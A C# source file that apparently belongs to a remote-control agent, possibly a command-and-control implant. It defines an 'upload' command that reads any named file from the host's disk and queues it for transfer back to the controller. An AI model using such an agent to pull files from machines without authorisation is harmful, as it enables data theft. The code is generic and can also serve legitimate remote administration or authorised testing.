using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class UploadCommand : AgentCommand
    {
        public override string Name => "upload";

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            if (task.SplittedArgs.Length == 0)
            {
                context.Result.Result = "Please specify the name of the file to upload!";
                return;
            }

            var path = task.SplittedArgs[0];
            var filename = Path.GetFileName(path);

            if (!File.Exists(path))
            {
                context.Result.Result = $"File {path} not found.";
                return;
            }

            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(path))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            if (task.SplittedArgs.Length > 1)
                filename = task.SplittedArgs[1];
            else
                filename = Path.GetFileName(filename);

            var fileId = Guid.NewGuid().ToString();
            context.FileService.AddFileToUpload(fileId, filename, fileBytes);

            this.CheckFileUploaded(fileId, filename, context);


            context.Result.Files.Add(new TaskFileResult()
            {
                FileId = fileId,
                FileName = filename,
            });


        }
    }
}
